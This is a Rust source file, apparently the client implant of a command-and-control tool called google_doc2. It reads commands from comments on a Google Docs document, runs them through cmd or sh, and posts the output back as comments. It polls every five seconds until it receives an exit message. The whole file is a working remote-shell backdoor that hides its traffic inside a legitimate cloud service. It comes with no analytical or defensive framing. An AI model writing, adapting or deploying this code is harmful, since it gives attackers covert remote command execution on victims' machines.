use google_doc2::shell::{read_all_messages, Message};
use google_doc2::GoogleDocsC2;

#[async_std::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let c2 = GoogleDocsC2::new(env!(
        "DOCS_URL",
        "Must specify a DOCS_URL in the environment variable!"
    ))
    .await?;

    'outer: loop {
        let msgs = read_all_messages(&c2).await?;
        for msg in &msgs {
            if msgs.iter().any(|output_msg| {
                output_msg.message_id == msg.message_id
                    && output_msg.message_type == google_doc2::shell::MessageType::Output
            }) {
                continue;
            }
            if msg.message_type == google_doc2::shell::MessageType::Exit {
                c2.add_comment(
                    &Message {
                        message_type: google_doc2::shell::MessageType::Output,
                        message_id: msg.message_id,
                        message: "Exiting...".to_string(),
                    }
                    .to_string(),
                )
                .await?;
                break 'outer;
            }
            if msg.message_type == google_doc2::shell::MessageType::Command {
                let output = if cfg!(target_os = "windows") {
                    std::process::Command::new("cmd")
                        .arg("/C")
                        .arg(&msg.message)
                        .output()?
                } else if cfg!(target_os = "linux") {
                    std::process::Command::new("sh")
                        .arg("-c")
                        .arg(&msg.message)
                        .output()?
                } else {
                    panic!("Unsupported OS");
                };

                let output = String::from_utf8(output.stdout)?;
                c2.add_comment(
                    &Message {
                        message_type: google_doc2::shell::MessageType::Output,
                        message_id: msg.message_id,
                        message: output,
                    }
                    .to_string(),
                )
                .await?;
            }
        }
        async_std::task::sleep(std::time::Duration::from_secs(5)).await;
    }

    Ok(())
}
